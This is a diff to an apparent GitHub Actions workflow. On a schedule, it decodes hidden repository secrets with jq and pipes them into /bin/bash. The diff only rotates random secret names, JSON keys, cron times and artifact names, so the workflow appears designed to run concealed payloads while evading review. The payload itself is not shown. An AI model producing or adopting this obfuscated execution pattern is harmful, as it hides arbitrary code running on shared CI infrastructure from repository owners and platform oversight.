@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '5 5,11,17,23 * * *'
+    - cron: '27 2,8,14,20 * * *'
 permissions:
   contents: read
   actions: read
@@ -24,18 +24,15 @@ jobs:
           fetch-depth: 1
       - name: Invoke
         env:
-          swx44: ${{ secrets.swx44 }}
+          nt7495: ${{ secrets.nt7495 }}
         run: |
-          printf '%s' "$swx44" | jq -r .ii71 | /bin/bash
-          printf '%s' "$y7772" | jq -r .z08688 | /bin/bash
-          printf '%s' "$ez26026" | jq -r .dumgl692 | /bin/bash
-          echo $n631 | jq -r .th541 | /bin/bash
-          echo $lzaae05 | jq -r .apyy351 | /bin/bash
+          printf '%s' "$nt7495" | jq -r .uia44681 | /bin/bash
+          printf '%s' "$gr6582" | jq -r .w6952 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: gIkeH4L3
+          name: dBg2x7qA
           path: "*.zip"
           retention-days: 1
